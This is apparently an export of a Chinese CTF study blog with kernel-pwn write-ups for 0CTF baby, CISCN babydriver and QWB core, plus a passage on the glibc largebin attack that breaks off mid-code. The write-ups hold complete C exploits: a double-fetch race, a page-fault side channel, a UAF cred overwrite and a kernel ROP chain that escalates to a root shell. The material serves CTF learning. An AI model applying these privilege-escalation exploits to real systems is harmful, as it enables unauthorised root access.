Kernel这次题目的附件只有驱动和文件系统没有bzImage\ntcdy@arch-linux ..study_kernel/2018_0CTFFinalsBabyKernel % strings baby.ko | grep vermagic=vermagic=4.15.0-22-generic SMP mod_unload\n\ntcdy@196082:~/Desktop/download/study_kernel$ sudo apt download linux-image-4.15.0-22-generic Get:1 https://mirrors.ustc.edu.cn/ubuntu bionic-updates/main amd64 linux-image-4.15.0-22-generic amd64 4.15.0-22.24 [7,875 kB]Fetched 7,875 kB in 1s (5,913 kB/s)tcdy@196082:~/Desktop/download/study_kernel$ ar x linux-image-4.15.0-22-generic_4.15.0-22.24_amd64.debtcdy@196082:~/Desktop/download/study_kernel$ tar -xf data.tar.xztcdy@196082:~/Desktop/download/study_kernel$ cd boot/tcdy@196082:~/Desktop/download/study_kernel/boot$ file vmlinuz-4.15.0-22-generic vmlinuz-4.15.0-22-generic: Linux kernel x86 boot executable bzImage, version 4.15.0-22-generic (buildd@lgw01-amd64-013) #24-Ubuntu SMP Wed May 16 12:15:17 UTC 2018, RO-rootFS, swap_dev 0x7, Normal VGA\n\n分析驱动__int64 __fastcall baby_ioctl(__int64 a1, __int64 a2)&#123;  __int64 v2; // rdx  int i; // [rsp-5Ch] [rbp-5Ch]  __int64 v5; // [rsp-58h] [rbp-58h]  _fentry__(a1, a2);  v5 = v2;  if ( (_DWORD)a2 == 0x6666 )  &#123;    printk(&quot;Your flag is at %px! But I don&#x27;t think you know it&#x27;s content\\n&quot;, flag);    return 0LL;  &#125;  else if ( (_DWORD)a2 == 0x1337         &amp;&amp; (unsigned __int8)_chk_range_not_ok(v2, 16LL, *(_QWORD *)(__readgsqword((unsigned int)&amp;current_task) + 4952)) != 1         &amp;&amp; (unsigned __int8)_chk_range_not_ok(                               *(_QWORD *)v5,                               *(int *)(v5 + 8),                               *(_QWORD *)(__readgsqword((unsigned int)&amp;current_task) + 4952)) != 1         &amp;&amp; *(_DWORD *)(v5 + 8) == strlen(flag) )  &#123;    for ( i = 0; i &lt; strlen(flag); ++i )    &#123;      if ( *(_BYTE *)(*(_QWORD *)v5 + i) != flag[i] )        return 22LL;    &#125;    printk(&quot;Looks like the flag is not a secret anymore. So here is it %s\\n&quot;, flag);    return 0LL;  &#125;  else  &#123;    return 14LL;  &#125;&#125;\n\n首先可以看到函数分为两部分，第一部分就是打印出flag的地址，第二部分则是经过两次检验之后进入下面的逐字节对比。\nbool __fastcall _chk_range_not_ok(__int64 a1, __int64 a2, unsigned __int64 a3)&#123;  bool v3; // cf  unsigned __int64 v4; // rdi  v3 = __CFADD__(a2, a1);  v4 = a2 + a1;  return v3 || a3 &lt; v4;&#125;\n\n这个验证函数些许看不懂，直接看汇编好一点\n.text:0000000000000000 55                            push    rbp.text:0000000000000001 48 01 F7                      add     rdi, rsi.text:0000000000000004 48 89 E5                      mov     rbp, rsp.text:0000000000000007 72 08                         jb      short loc_11.text:0000000000000007.text:0000000000000009 48 39 FA                      cmp     rdx, rdi.text:000000000000000C 0F 92 C0                      setb    al.text:000000000000000F 5D                            pop     rbp.text:0000000000000010 C3                            retn.text:0000000000000010.text:0000000000000011                               ; -----------------------------------------------------------------------.text:0000000000000011.text:0000000000000011                               loc_11:                    ; CODE XREF: __chk_range_not_ok+7↑j.text:0000000000000011 B8 01 00 00 00                mov     eax, 1.text:0000000000000016 5D                            pop     rbp.text:0000000000000017 C3                            retn\n\n就是第一个参数和第二个参数的和必须小于第三个参数\n&amp;&amp; (unsigned __int8)_chk_range_not_ok(v2, 16LL, *(_QWORD *)(__readgsqword((unsigned int)&amp;current_task) + 4952)) != 1    &amp;&amp; (unsigned __int8)_chk_range_not_ok(    *(_QWORD *)v5,    *(int *)(v5 + 8),    *(_QWORD *)(__readgsqword((unsigned int)&amp;current_task) + 4952)) != 1\n\n\n可以看到这里其实就是看看传入的参数是否是用户态\n这道提分为两种利用方式，这里都提一下(毕竟我都还不会)\nDouble Fetch这一利用方式可以看做是条件竞争，这里是两次验证，第一次验证是否为用户态，第二次逐字检查flag，那么要是在第一检查结束后将地址换成正真的flag地址，那么后一个验证即可绕过\n#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;fcntl.h&gt;#include &lt;pthread.h&gt;int finished = 0;int Time = 1000;size_t flag_addr;struct fake_flag&#123;    size_t *addr;    size_t size;&#125;;void change_flag_addr(void *s)&#123;    struct fake_flag *a = s;    while (finished == 0)    &#123;        a-&gt;addr = flag_addr;    &#125;&#125;int main(argc, argv)&#123;    setvbuf(stdin, 0, 2, 0);    setvbuf(stdout, 0, 2, 0);    setvbuf(stderr, 0, 2, 0);    struct fake_flag target;    int fd = open(&quot;/dev/baby&quot;, 0);    ioctl(fd, 0x6666);    system(&quot;dmesg &gt; record.txt&quot;);    int flag_addr_fd = open(&quot;./record.txt&quot;, O_RDONLY);    char buf[0x1000] = &#123;0&#125;;    lseek(flag_addr_fd, -0x1000, SEEK_END);    read(flag_addr_fd, buf, sizeof(buf));    close(flag_addr_fd);    char *idx;    idx = strstr(buf, &quot;Your flag is at &quot;);    flag_addr = strtoull(idx + 16, idx + 32, 16);    printf(&quot;[*]flag addr=&gt;%p\\n&quot;, flag_addr);    target.addr = buf;    target.size = 33;    pthread_t thread;    pthread_create(&amp;thread, NULL, change_flag_addr, &amp;target);    for (int i = 0; i &lt; Time; i++)    &#123;        ioctl(fd, 0x1337, &amp;target);        target.addr = buf;    &#125;    finished = 1;    pthread_join(thread, NULL);    close(fd);    puts(&quot;[+]result is :&quot;);    system(&quot;dmesg | grep flag&quot;);&#125;\n\n侧信道攻击名字虽然听起来很高端，实际干的事情就是爆破每一个字节。\n方法的原理就是：创建三个段，除了中间的段可读可写外，其他段的权限都为000，那么我们将flag放到第二个段的末尾，然后将猜测的字符放到最后一个，当最后一个字符不正确的时候就会直接退出，但是当最后一个字符正确的时候就会因为权限问题报错，并且系统崩溃\n\n#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;pthread.h&gt;#include &lt;sys/mman.h&gt;int main()&#123;    char *ch = &quot;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890,._-&quot;;    char flag[0x30] = &#123;0&#125;;    char command[0x100] = &#123;0&#125;;    char command1[0x100] = &#123;0&#125;;    FILE *fd = fopen(&quot;save.txt&quot;, &quot;r&quot;);    fscanf(fd, &quot;%s&quot;, flag);    fclose(fd);    for (int i = 0; i &lt; strlen(ch); i++)    &#123;        sprintf(command, &quot;echo \\&quot;%s%c\\&quot; &gt; save.txt&quot;, flag, ch[i]);        sprintf(command1, &quot;./exp %s%c&quot;, flag, ch[i]);        system(command);        system(command1);    &#125;&#125;\n\n#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;pthread.h&gt;#include &lt;sys/mman.h&gt;struct flag&#123;    size_t addr;    size_t size;&#125;;main(int argc, char *argv[])&#123;    char *buf;    mmap(0, 0x1000, PROT_NONE, MAP_SHARED | MAP_ANONYMOUS, 0, 0);    buf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, 0, 0);    mmap(0, 0x1000, PROT_NONE, MAP_SHARED | MAP_ANONYMOUS, 0, 0);    for (int i = 0; i &lt; strlen(argv[1]); i++)    &#123;        buf[0x1000 - strlen(argv[1]) + i] = argv[1][i];    &#125;    printf(&quot;[*]flag=&gt;%s\\n&quot;, argv[1]);    struct flag target;    target.size = 33;    target.addr = buf + 0x1000 - strlen(argv[1]);    int fd = open(&quot;/dev/baby&quot;, O_RDWR);    ioctl(fd, 0x1337, &amp;target);    close(fd);&#125;\n\n","categories":["kernel-pwn"],"tags":["Double Fetch","侧信道攻击"]},{"title":"kernel pwn基础","url":"/2022/03/21/kernel-pwn%E5%9F%BA%E7%A1%80/","content":"在学习kernel pwn我就是完全跟着wiki走的\nCISCN2017 - babydriver前置首先题目一般是会给我们三个文件，bzImage，boot.sh，rootfs.cpio\nboot.sh：启动kernel的shell脚本\nbzImage：kernel binary\nrootfs.cpio：文件系统\n这里要看文件系统的话需要先改变尾缀为gz，然后gunzip rootfs.cpio.gz，最后再cpio -idmv &lt; rootfs.cpio\n~/download/study_kernel/core ls                                                 bin  etc  home  init  lib  linuxrc  proc  rootfs.cpio  sbin  sys  tmp  usr\n\n接下来查看init文件\n~/download/study_kernel/core cat ./init -n                                          1\t#!/bin/sh     2\t      3\tmount -t proc none /proc     4\tmount -t sysfs none /sys     5\tmount -t devtmpfs devtmpfs /dev     6\tchown root:root flag     7\tchmod 400 flag     8\texec 0&lt;/dev/console     9\texec 1&gt;/dev/console    10\texec 2&gt;/dev/console    11\t    12\tinsmod /lib/modules/4.4.72/babydriver.ko    13\tchmod 777 /dev/babydev    14\techo -e &quot;\\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\\n&quot;    15\tsetsid cttyhack setuidgid 1000 sh    16\t    17\tumount /proc    18\tumount /sys    19\tpoweroff -d 0  -f    20\n\n可以看到在12行的时候加入一个驱动文件，一般这就是漏洞LKM。拿到驱动文件开始分析\n分析代码\n首先可以看到除了堆栈不可执行其余保护都是没开的\n\n首先在ida可以看到这一结构体\n再看babyioctl函数：\n__int64 __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg)&#123;  size_t v3; // rdx  size_t v4; // rbx  _fentry__(filp, command, arg);  v4 = v3;  if ( command == 0x10001 )  &#123;    kfree(babydev_struct.device_buf);    babydev_struct.device_buf = _kmalloc(v4, 0x24000C0LL);    babydev_struct.device_buf_len = v4;    printk(&quot;alloc done\\n&quot;, 0x24000C0LL);    return 0LL;  &#125;  else  &#123;    printk(&amp;unk_2EB, v3);    return -22LL;  &#125;&#125;\n\n可以看到，这里在command为0x10001时，会先free掉以前的chunk，随后malloc一个我们给他的size的chunk。\nbabyopen:\nint __fastcall babyopen(inode *inode, file *filp)&#123;  _fentry__(inode, filp);  babydev_struct.device_buf = kmem_cache_alloc_trace(kmalloc_caches[6], 0x24000C0LL, 0x40LL);  babydev_struct.device_buf_len = 64LL;  printk(&quot;device open\\n&quot;, 0x24000C0LL);  return 0;&#125;\n\n这里就会生成一个size为0x40的chunk\nbabyrelease:\nint __fastcall babyrelease(inode *inode, file *filp)&#123;  _fentry__(inode, filp);  kfree(babydev_struct.device_buf);  printk(&quot;device release\\n&quot;, filp);  return 0;&#125;\n\n这里会释放掉结构体所储存的chunk指针。\nbabyread:\nssize_t __fastcall babyread(file *filp, char *buffer, size_t length, loff_t *offset)&#123;  size_t v4; // rdx  ssize_t result; // rax  ssize_t v6; // rbx  _fentry__(filp, buffer);  if ( !babydev_struct.device_buf )    return -1LL;  result = -2LL;  if ( babydev_struct.device_buf_len &gt; v4 )  &#123;    v6 = v4;    copy_to_user(buffer);    return v6;  &#125;  return result;&#125;\n\n这里就是如果我们传入的size小于储存的size即可实行copy_to_user。\nbabywrite:\nssize_t __fastcall babywrite(file *filp, const char *buffer, size_t length, loff_t *offset)&#123;  size_t v4; // rdx  ssize_t result; // rax  ssize_t v6; // rbx  _fentry__(filp, buffer);  if ( !babydev_struct.device_buf )    return -1LL;  result = -2LL;  if ( babydev_struct.device_buf_len &gt; v4 )  &#123;    v6 = v4;    copy_from_user();    return v6;  &#125;  return result;&#125;\n\n这里和上面的验证一样。\n解题思路这里可以看到不存在任何溢出，但是这里跟传统用户态不同的是这里的全局变量是整个系统中全局的。那意思就是这里是存在UAF漏洞的。\n所以基本思路就是：\n 1. 首先打开两次设备，更改chunk size为cred结构体的size\n 2. 释放其中一个，这时就会出现0xa8的空白，那么我们fork一个新的进程，就会让进程的cred结构体占据那一空间\n 3. 我们还可以通过另一文件描述符修改掉内部的值，提权到root\n\n综上得出exp：\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;// #include &lt;stropts.h&gt;#include &lt;sys/wait.h&gt;#include &lt;sys/stat.h&gt;int main()&#123;    int fd1 = open(&quot;/dev/babydev&quot;, 2);    int fd2 = open(&quot;/dev/babydev&quot;, 2);    ioctl(fd1, 0x10001, 0xa8);    close(fd1);    int pid = fork();    if (pid &lt; 0)    &#123;        puts(&quot;[*] error!&quot;);        exit(0);    &#125;    else if (pid == 0)    &#123;        char payload[30] = &#123;0&#125;;        write(fd2, payload, sizeof(payload));        if (getuid() == 0)        &#123;            puts(&quot;[+] root now!&quot;);            system(&quot;/bin/sh&quot;);            exit(0);        &#125;    &#125;    else    &#123;        wait(NULL);    &#125;    close(fd2);&#125;\n\n最后使用gcc静态编译打包进文件系统就好了\ngcc exploit.c -static -o exploitcp exploit core/tmp find . | cpio -o --format=newc &gt; rootfs.cpiocp rootfs.cpio ..\n\n2018 强网杯 - core这道题目的文件多了一个vmlinux，是未经过压缩的kernel文件，不过根据我的实践发现不能直接在题目给的vmlinux提取gedget，可以通过extract-vmlinux提取vmlinux来获取再用Ropper来提取。\n一样的先看一下start.sh\ntcdy@arch-linux ~/Downloads/study_kernel % cat -n start.sh      1\tqemu-system-x86_64 \\     2\t-m 256M \\     3\t-kernel ./bzImage \\     4\t-initrd  ./core.cpio \\     5\t-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \\     6\t-s  \\     7\t-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \\     8\t-nographic  \\\n\n可以看到在第五行里面开启了kaslr，这一保护类似与aslr，需要泄漏地址才能获取gadget的地址。\n再看一下init文件\ntcdy@arch-linux ~/Downloads/study_kernel/core % cat -n init      1\t#!/bin/sh     2\tmount -t proc proc /proc     3\tmount -t sysfs sysfs /sys     4\tmount -t devtmpfs none /dev     5\t/sbin/mdev -s     6\tmkdir -p /dev/pts     7\tmount -vt devpts -o gid=4,mode=620 none /dev/pts     8\tchmod 666 /dev/ptmx     9\tcat /proc/kallsyms &gt; /tmp/kallsyms    10\techo 1 &gt; /proc/sys/kernel/kptr_restrict    11\techo 1 &gt; /proc/sys/kernel/dmesg_restrict    12\tifconfig eth0 up    13\tudhcpc -i eth0    14\tifconfig eth0 10.0.2.15 netmask 255.255.255.0    15\troute add default gw 10.0.2.2     16\tinsmod /core.ko    17\t    18\t#poweroff -d 120 -f &amp;    19\tsetsid /bin/cttyhack setuidgid 1000 /bin/sh    20\techo &#x27;sh end!\\n&#x27;    21\tumount /proc    22\tumount /sys    23\t    24\tpoweroff -d 0  -f\n\n可以看到第9行里面，系统将/proc/kallsyms放到了/tmp目录，然后又将kptr_restrict和dmesg_restrict设置为1，就不能通过/proc/kallsyms查看函数地址，以及用dmesg来查看kernel信息了。\n随后看一下驱动文件的保护：\n\n(这篇文章居然跟着我换个系统，哈哈哈哈哈！)\n分析驱动__int64 init_module()&#123;  core_proc = proc_create(&quot;core&quot;, 438LL, 0LL, &amp;core_fops);  printk(&quot;\\x016core: created /proc/core entry\\n&quot;);  return 0LL;&#125;\n\n看一下可以看到注册到了/proc/core\n__int64 __fastcall core_ioctl(__int64 a1, int a2, __int64 a3)&#123;  switch ( a2 )  &#123;    case 0x6677889B:      core_read(a3);      break;    case 0x6677889C:      printk(&amp;unk_2CD);      off = a3;      break;    case 0x6677889A:      printk(&amp;unk_2B3);      core_copy_func(a3);      break;  &#125;  return 0LL;&#125;\n\ncore_ioctl函数可以看到十三个选项，分别看一下\nunsigned __int64 __fastcall core_read(__int64 a1)&#123;  char *v2; // rdi  __int64 i; // rcx  unsigned __int64 result; // rax  char v5[64]; // [rsp+0h] [rbp-50h] BYREF  unsigned __int64 v6; // [rsp+40h] [rbp-10h]  v6 = __readgsqword(0x28u);  printk(&amp;unk_25B);  printk(&amp;unk_275);  v2 = v5;  for ( i = 16LL; i; --i )  &#123;    *v2 = 0;    v2 += 4;  &#125;  strcpy(v5, &quot;Welcome to the QWB CTF challenge.\\n&quot;);  result = copy_to_user(a1, &amp;v5[off], 64LL);  if ( !result )    return __readgsqword(0x28u) ^ v6;  __asm &#123; swapgs &#125;  return result;&#125;\n\n第一个core_read在最后做了一件事，就是吧v5[off]的值给到了我们的a1，然而这里的a1又是上一级a3，所以我们使用ioctl函数的第三个参数可以接收到这一值\ncase 0x6677889C:      printk(&amp;unk_2CD);      off = a3;      break;\n\n这里第二个选项可以看到我们还可以随意的修改off，所以我们可以这一方式泄漏出一些值，比如canary\n__int64 __fastcall core_copy_func(__int64 a1)&#123;  __int64 result; // rax  _QWORD v2[10]; // [rsp+0h] [rbp-50h] BYREF  v2[8] = __readgsqword(0x28u);  printk(&amp;unk_215);  if ( a1 &gt; 63 )  &#123;    printk(&amp;unk_2A1);    return 0xFFFFFFFFLL;  &#125;  else  &#123;    result = 0LL;    qmemcpy(v2, &amp;name, (unsigned __int16)a1);  &#125;  return result;&#125;\n\n然后第三个选项里可以看到将name全局变量复制到v2里，并且可以看到在获取参数时的数据类型为int64但是在qmemcpy函数内使用的却是unsigned int16，如果我们传入的是0xffffffffffff0100就可以造成栈溢出。\n__int64 __fastcall core_write(__int64 a1, __int64 a2, unsigned __int64 a3)&#123;  printk(&amp;unk_215);  if ( a3 &lt;= 0x800 &amp;&amp; !copy_from_user(&amp;name, a2, a3) )    return (unsigned int)a3;  printk(&amp;unk_230);  return 4294967282LL;&#125;\n\n并且在write函数我们还可以控制全局变量name的内容。\n解题思路 1. 通过设置off，使用core_read()泄漏出canary\n 2. 通过core_write()修改name的值，构造rop链\n 3. 通过core_copy_func()实现栈溢出，进行rop\n 4. 返回用户态通过system(&quot;/bin/sh&quot;);获得root shell\n\n在这里需要注意的是在进入内核之前会保存用户态的各种寄存器，所以在最后还要恢复各种寄存器。这里看一下push保存寄存器的操作：\npushq  $__USER_DS      /* pt_regs-&gt;ss */pushq  PER_CPU_VAR(rsp_scratch)  /* pt_regs-&gt;sp */pushq  %r11             /* pt_regs-&gt;flags */pushq  $__USER_CS      /* pt_regs-&gt;cs */pushq  %rcx             /* pt_regs-&gt;ip */\n\n由于我们会进行ROP，在结束时rsp的值会变动，所以我们就需要自己构造一些值来保证能够正常恢复到用户态。\nvoid save_status()&#123;    __asm__(        &quot;mov user_cs, cs;&quot;        &quot;mov user_ss, ss;&quot;        &quot;mov user_sp, rsp;&quot;        &quot;pushf;&quot;        &quot;pop user_rflags;&quot;);    puts(&quot;[*]status has been saved.&quot;);&#125;\n\n可以看到上面只有四个被保存了，因为最后我们希望rip跳转到system(“/bin/sh”);的地址，所以我们只需要好好构造好栈数据即可。\nexp#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/ioctl.h&gt;size_t user_cs, user_ss, user_sp, user_rflags;void save_status()&#123;    __asm__(        &quot;mov user_cs, cs;&quot;        &quot;mov user_ss, ss;&quot;        &quot;mov user_sp, rsp;&quot;        &quot;pushf;&quot;        &quot;pop user_rflags;&quot;);    puts(&quot;[*]status has been saved.&quot;);&#125;size_t raw_vmlinux_base = 0xffffffff81000000;size_t commit_creds = 0, prepare_kernel_cred = 0, vmlinux_base = 0;void find_symbols()&#123;    FILE *file = fopen(&quot;/tmp/kallsyms&quot;, &quot;r&quot;);    if (file &lt; 0)    &#123;        puts(&quot;[*]open kallsyms error!&quot;);        exit(0);    &#125;    char buf[0x30] = &#123;0&#125;;    while (fgets(buf, 0x30, file))    &#123;        if (commit_creds &amp; prepare_kernel_cred)            return;        if (strstr(buf, &quot;commit_creds&quot;) &amp;&amp; !commit_creds)        &#123;            char hex[20] = &#123;0&#125;;            strncpy(hex, buf, 16);            sscanf(hex, &quot;%llx&quot;, &amp;commit_creds);            printf(&quot;commit_creds addr: %p\\n&quot;, commit_creds);            vmlinux_base = commit_creds - 0x9c8e0;            printf(&quot;vmlinux_base addr: %p\\n&quot;, vmlinux_base);        &#125;        if (strstr(buf, &quot;prepare_kernel_cred&quot;) &amp;&amp; !prepare_kernel_cred)        &#123;            char hex[20] = &#123;0&#125;;            strncpy(hex, buf, 16);            sscanf(hex, &quot;%llx&quot;, &amp;prepare_kernel_cred);            printf(&quot;prepare_kernel_cred addr: %p\\n&quot;, prepare_kernel_cred);        &#125;    &#125;    if (!(prepare_kernel_cred &amp; commit_creds))    &#123;        puts(&quot;[*]Error!&quot;);        exit(0);    &#125;&#125;void get_root()&#123;    if (!getuid())    &#123;        puts(&quot;[*] root now!&quot;);        system(&quot;/bin/sh&quot;);    &#125;    else    &#123;        puts(&quot;[*]spawn shell error!&quot;);    &#125;    exit(0);&#125;int main()&#123;    save_status();    int fd = open(&quot;/proc/core&quot;, 2);    if (fd &lt; 0)    &#123;        puts(&quot;[*]open /proc/core error!&quot;);        exit(0);    &#125;    find_symbols();    ssize_t offset = vmlinux_base - raw_vmlinux_base;    ioctl(fd, 0x6677889C, 0x40);    char buf[0x30] = &#123;0&#125;;    ioctl(fd, 0x6677889B, buf);    size_t canary = ((size_t *)buf)[0];    size_t payload[0x1000] = &#123;0&#125;;    int i;    for (i = 0; i &lt; 10; i++)    &#123;        payload[i] = canary;    &#125;    payload[i++] = 0xffffffff81000b2f + offset; // pop rdi; ret;    payload[i++] = 0;    payload[i++] = prepare_kernel_cred;    payload[i++] = 0xffffffff810a0f49 + offset; // pop rdx; ret;    payload[i++] = commit_creds;    payload[i++] = 0xffffffff8106a6d2 + offset; // mov rdi, rax; jmp rdx;    payload[i++] = 0xffffffff81a012da + offset; // swapgs; popfq; ret;    payload[i++] = 0;    payload[i++] = 0xffffffff81050ac2 + offset; // iretq; ret;    payload[i++] = (size_t)get_root;    payload[i++] = user_cs;    payload[i++] = user_rflags;    payload[i++] = user_sp;    payload[i++] = user_ss;    write(fd, payload, 0x800);    ioctl(fd, 0x6677889A, 0xffffffffffff0100);&#125;\n\nrop[i++] = 0xffffffff81000b2f + offset; // pop rdi; retrop[i++] = 0;rop[i++] = prepare_kernel_cred;         // prepare_kernel_cred(0)rop[i++] = 0xffffffff810a0f49 + offset; // pop rdx; retrop[i++] = 0xffffffff81021e53 + offset; // pop rcx; retrop[i++] = 0xffffffff8101aa6a + offset; // mov rdi, rax; call rdx; rop[i++] = commit_creds;rop[i++] = 0xffffffff81a012da + offset; // swapgs; popfq; retrop[i++] = 0;rop[i++] = 0xffffffff81050ac2 + offset; // iretq; ret; rop[i++] = (size_t)spawn_shell;         // rip rop[i++] = user_cs;rop[i++] = user_rflags;rop[i++] = user_sp;rop[i++] = user_ss;\n\n这里是wiki上的payload片段，但是我有点不明白的是这里为什么要把mov rdi, rax; call rdx;的地址放到rcx里，并且这里不应该使用call rdx，如果是使用了call的话就会导致在结束是ret回来的地址就是gadget后面紧随的地址了，这也就导致swapgs以及后续rop chain无法执行，所以这里应该用jmp来代替(我也是在动态调试中发现的)。\n其次\n\n这里可以看到是可以泄漏出core_ioctl的地址的，所以我们可以不是用/tmp/kallsyms来获取地址。\nraw_vmlinux_base的由来：\ntcdy@arch-linux ~/Downloads/study_kernel % objdump -h test test:     file format elf64-x86-64Sections:Idx Name          Size      VMA               LMA               File off  Algn  0 .text         00c0325d  ffffffff81000000  0000000001000000  00200000  2**12                  CONTENTS, ALLOC, LOAD, READONLY, CODE\n\ncommit_creds偏移的由来：\n&gt;&gt;&gt; hex(ELF(&quot;./core/vmlinux&quot;).symbols[&#x27;commit_creds&#x27;]-0xffffffff81000000)&#x27;0x9c8e0&#x27;\n\n\n参考文章https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/#get-root-shell\n","categories":["kernel-pwn"],"tags":["kernel UAF","kernel ROP"]},{"title":"largebin attack","url":"/2022/02/23/largebin-attack/","content":"关于largebin的原理这里就只给一张图吧，也是在网上找的(我懒得画)。\n\nlargebin一直是容易被忽略的利用方式(可能只是我这样吧)，在此之前我一直觉得largebin不会出现直到最近的比赛怎么全是这玩意，所以又下来学习了一遍。\nGlibc2.23到Glibc2.27下的largebin attack其实Glibc2.27和Glibc2.23的利用方式都差不多，只不过在2.27里增加了tcache机制，所以想实现largebin attack要么占满tcache，或则大于tcache范围。\n下面源码是当unsorted bin 当作的chunk进入large bin的过程\nvictim_index = largebin_index (size);bck = bin_at (av, victim_index); fwd = bck-&gt;fd;/* maintain large bins in sorted order */if (fwd != bck)&#123;    /* Or with inuse bit to speed comparisons */    size |= PREV_INUSE;    /* if smaller than smallest, bypass loop below */    assert (chunk_main_arena (bck-&gt;bk));    if ((unsigned long) (size)                       &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))    &#123;        fwd = bck;        bck = bck-&gt;bk;        victim-&gt;fd_nextsize = fwd-&gt;fd;        victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;         fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;    &#125;    else     &#123;        assert (chunk_main_arena (fwd));        while ((unsigned long) size &lt; chunksize_nomask (fwd))         &#123;            fwd = fwd-&gt;fd_nextsize;            assert (chunk_main_arena (fwd));        &#125;        if ((unsigned long) size            == (unsigned long) chunksize_nomask (fwd))            /* Always insert in the second position.  */            fwd = fwd-&gt;fd;         else        &#123;            victim-&gt;fd_nextsize = fwd;            victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;            fwd-&gt;bk_nextsize = victim;            victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;        &#125;        bck = fwd-&gt;bk;    &#125;&#125;else    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;&#125;mark_bin (av, victim_index);victim-&gt;bk = bck;victim-&gt;fd = fwd;fwd-&gt;bk = victim;bck-&gt;fd = victim;\n\n这里的第二个if判断的就是size如果小于最小的size的时候发生的事情，但是那里的内容相较于下面不是很好利用。所以直接看下面。\n    if ((unsigned long) size        == (unsigned long) chunksize_nomask (fwd))        /* Always insert in the second position.  */        fwd = fwd-&gt;fd;     else    &#123;        victim-&gt;fd_nextsize = fwd;        victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;        fwd-&gt;bk_nextsize = victim;        victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;    &#125;    bck = fwd-&gt;bk;    &#125;    else        victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;    &#125;mark_bin (av, victim_index);victim-&gt;bk = bck;victim-&gt;fd = fwd;fwd-&gt;bk = victim;bck-&gt;fd = victim;\n\n这里就是我们主要的利用代码，这里的if判断的是找到相同size的chunk发生什么，但是我们真正利用的代码其实是else里面的。现在假设我们存在一个已经在large bin的chunk1：\nsize = 0x450;&#123;    fd = 0;    bk = 0;    fd_nextsize = 0;    bk_nextsize = target-0x20;&#125;\n\n和一个在unsorted bin当中的chunk2：\nsize = 0x460;&#123;    fd = 0;    bk = 0;    fd_nextsize = 0;    bk_nextsize = 0;&#125;\n\n当我们下一次malloc一个size大于0x460的chunk时那么chunk2就会进入large bin，此时就会执行以下代码：\nvictim-&gt;fd_nextsize = fwd;victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;fwd-&gt;bk_nextsize = victim;victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;\n\n翻译过来就是：\nchunk2-&gt;fd_nextsize = chunk1;chunk2-&gt;bk_nextsize = chunk1-&gt;bk_nextsize; // chunk1-&gt;bk_nextsize = target-0x20// 这一步过后，chunk2-&gt;bk_next_size也就变成了target-0x20chunk1-&gt;bk_nextsize = chunk2;chunk2-&gt;bk_nextsize-&gt;fd_nextsize = chunk2;// 所以这一步最终的形式其实是*(target-0x20)-&gt;fd_nextsize = chunk2;\n\nvictim这样就在target位置写上了chunk2的地址。\n另外在这里还存在另一个可以任意地址写入堆地址的地方：\n此时chunk1变为:\nsize = 0x450;&#123;    fd = 0;    bk = target-0x10;    fd_nextsize = 0;    bk_nextsize = 0;&#125;\n\n\n\n// bck = fwd-&gt;bk;   上面执行完之后有这样一句victim-&gt;bk = bck;victim-&gt;fd = fwd;fwd-&gt;bk = victim;bck-&gt;fd = victim;\n\n翻译过来也就是：\nchunk2-&gt;bk = target-0x10;chunk2-&gt;fd = chunk1;chunk1-&gt;bk = chunk2;*(target-0x10)-&gt;fd = chunk2;\n\n也就是如果同时修改了bk和bk_nextsize的话可以同时修改两处地址的值为堆地址。\nGlibc2.29下的largebin attack这里的攻击方式和上面的很类似，首先看一下源码：\n    \tvictim_index = largebin_index (size);       bck = bin_at (av, victim_index);      fwd = bck-&gt;fd;      /* maintain large bins in sorted order */      if (fwd != bck)        &#123;          /* Or with inuse bit to speed comparisons */          size |= PREV_INUSE;          /* if smaller than smallest, bypass loop below */          assert (chunk_main_arena (bck-&gt;bk));          if ((unsigned long) (size)  &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))            &#123;              fwd = bck;              bck = bck-&gt;bk;              victim-&gt;fd_nextsize = fwd-&gt;fd;              victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;               fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;            &#125;          else            &#123;              assert (chunk_main_arena (fwd));              while ((unsigned long) size &lt; chunksize_nomask (fwd))                &#123;                  fwd = fwd-&gt;fd_nextsize;assert (chunk_main_arena (fwd));                &#125;              // but size must be different              if 